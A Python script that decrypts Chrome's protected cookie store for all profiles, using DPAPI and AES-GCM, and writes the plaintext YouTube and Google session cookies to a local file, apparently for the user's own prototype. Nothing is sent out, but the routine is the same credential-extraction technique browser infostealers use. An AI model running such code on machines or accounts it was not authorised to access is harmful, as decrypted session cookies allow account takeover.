import glob
import json
import base64
import os
import ctypes
import ctypes.wintypes
import sqlite3
import shutil
import tempfile
from Cryptodome.Cipher import AES

class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', ctypes.wintypes.DWORD),
                ('pbData', ctypes.POINTER(ctypes.c_char))]

def decrypt_dpapi(ciphertext):
    buffer = ctypes.create_string_buffer(ciphertext)
    blob_in = DATA_BLOB(ctypes.sizeof(buffer), buffer)
    blob_out = DATA_BLOB()
    ret = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
    )
    if not ret:
        raise RuntimeError('DPAPI failed: ' + str(ctypes.GetLastError()))
    res = ctypes.string_at(blob_out.pbData, blob_out.cbData)
    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    return res

def get_key(local_state_path):
    with open(local_state_path, 'r', encoding='utf-8') as f:
        data = json.load(f)
        encrypted_key = base64.b64decode(data['os_crypt']['encrypted_key'])[5:]
        return decrypt_dpapi(encrypted_key)

def decrypt_val(encrypted_val, key):
    if not encrypted_val:
        return ''
    if encrypted_val.startswith(b'v10') or encrypted_val.startswith(b'v11'):
        nonce = encrypted_val[3:15]
        ciphertext = encrypted_val[15:-16]
        tag = encrypted_val[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
    return ''

def export_cookies():
    local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
    key = get_key(local_state_path)

    cookie_files = glob.glob(os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\**\Network\Cookies'), recursive=True)
    print(f"Found {len(cookie_files)} Chrome cookie databases.")

    all_cookies = {}
    with tempfile.TemporaryDirectory() as td:
        for idx, cpath in enumerate(cookie_files):
            tmp_db = os.path.join(td, f'cookies_{idx}.sqlite')
            try:
                shutil.copy2(cpath, tmp_db)
            except Exception:
                continue
            
            try:
                conn = sqlite3.connect(tmp_db)
                cur = conn.cursor()
                cur.execute("SELECT host_key, path, is_secure, expires_utc, name, value, encrypted_value FROM cookies WHERE host_key LIKE '%youtube.com' OR host_key LIKE '%google.com'")
                rows = cur.fetchall()
                print(f"  {os.path.basename(os.path.dirname(os.path.dirname(cpath)))}: {len(rows)} cookies")
                for host, path, is_sec, exp, name, val, enc_val in rows:
                    if not val and enc_val:
                        try:
                            val = decrypt_val(enc_val, key)
                        except Exception:
                            val = ''
                    if val:
                        domain_flag = 'TRUE' if host.startswith('.') else 'FALSE'
                        sec_flag = 'TRUE' if is_sec else 'FALSE'
                        exp_sec = (exp // 1000000) - 11644473600 if exp > 0 else 0
                        all_cookies[(host, name, path)] = f"{host}\t{domain_flag}\t{path}\t{sec_flag}\t{exp_sec}\t{name}\t{val}"
                conn.close()
            except Exception as e:
                pass

    out_file = r"e:\Vision Guard\prototype\youtube_cookies.txt"
    with open(out_file, 'w', encoding='utf-8') as f:
        f.write("# Netscape HTTP Cookie File\n")
        for line in all_cookies.values():
            f.write(line + "\n")
    print(f"Exported {len(all_cookies)} unique YouTube/Google cookies to {out_file}")

if __name__ == '__main__':
    export_cookies()
